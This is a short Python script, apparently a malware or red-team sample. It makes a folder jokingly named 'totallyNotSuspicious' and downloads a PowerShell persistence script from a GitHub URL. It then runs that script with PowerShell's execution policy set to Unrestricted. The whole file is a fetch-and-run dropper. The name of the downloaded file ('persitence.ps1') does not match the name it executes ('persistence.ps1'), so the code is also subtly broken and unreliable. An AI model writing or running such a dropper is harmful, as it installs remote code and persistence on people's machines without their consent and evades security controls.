import subprocess
from pathlib import Path
import wget
import os
cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
os.mkdir(cwd)
os.chdir(cwd)
wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')

psexectaskscheduler = subprocess.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
